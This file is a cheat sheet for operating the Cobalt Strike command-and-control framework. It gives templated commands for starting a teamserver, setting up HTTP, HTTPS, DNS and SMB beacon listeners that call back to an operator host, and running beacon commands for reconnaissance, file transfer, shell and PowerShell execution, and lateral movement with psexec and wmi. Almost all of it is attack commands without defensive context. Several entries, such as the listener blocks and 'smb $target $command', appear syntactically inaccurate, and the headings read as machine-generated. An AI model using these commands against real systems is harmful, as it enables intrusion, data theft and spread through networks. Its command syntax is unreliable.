# Cobalt Strike

## setup

### Teamserver

Start teamserver with Cobalt Strike.

Start a Cobalt Strike teamserver.

```sh title:"Cobalt Strike Start Teamserver"
./teamserver "$external_ip" "$teamserver_pass"
```
<!-- cheat
var external_ip
var teamserver_pass
-->

### Client

Start client with Cobalt Strike.

Start the Cobalt Strike client.

```sh title:"Cobalt Strike Start Client"
./cobaltstrike
```
<!-- cheat -->

## listeners

### HTTP listener

List HTTP listener with Cobalt Strike.

Aggressor listener block for HTTP Beacon.

```sh title:"Cobalt Strike List HTTP Listener"
listener http { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; }
```
<!-- cheat
var domain_or_ip
var lport
-->

### HTTPS listener

List HTTPS listener with Cobalt Strike.

Aggressor listener block for HTTPS Beacon.

```sh title:"Cobalt Strike List HTTPS Listener"
listener https { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; set Cert "$certificate_path"; }
```
<!-- cheat
var domain_or_ip
var lport
var certificate_path
-->

### DNS listener

List DNS listener with Cobalt Strike.

Aggressor listener block for DNS Beacon.

```sh title:"Cobalt Strike List DNS Listener"
listener dns { set Host "$domain"; set Port "$lport"; set BindPort "$lport"; }
```
<!-- cheat
var domain
var lport
-->

### SMB listener

List SMB listener with Cobalt Strike.

Aggressor listener block for SMB Beacon.

```sh title:"Cobalt Strike List SMB Listener"
listener smb { set PipeName "$pipe_name"; }
```
<!-- cheat
var pipe_name
-->

## beacon

### Basic commands

Execute basic commands with Cobalt Strike.

Common Beacon job controls.

```sh title:"Cobalt Strike Execute Basic Commands"
help
sleep $seconds
jobs
jobkill $job_id
```
<!-- cheat
var seconds
var job_id
-->

### System info

Show system info with Cobalt Strike.

Common Beacon situational awareness commands.

```sh title:"Cobalt Strike Show System Info"
whoami
hostname
pwd
ps
netstat
```
<!-- cheat -->

### File operations

Run file operations with Cobalt Strike.

Common Beacon file operations.

```sh title:"Cobalt Strike Run File Operations"
ls $path
cd $path
download $file
upload $file
```
<!-- cheat
var path
var file
-->

### Execute commands

Execute commands with Cobalt Strike.

Common Beacon execution commands.

```sh title:"Cobalt Strike Execute Commands"
shell $command
execute $command
powershell $command
```
<!-- cheat
var command
-->

### Lateral movement

Execute lateral movement with Cobalt Strike.

Common Beacon lateral movement commands.

```sh title:"Cobalt Strike Execute Lateral Movement"
psexec $target $command
wmi $target $command
smb $target $command
```
<!-- cheat
var target
var command
-->
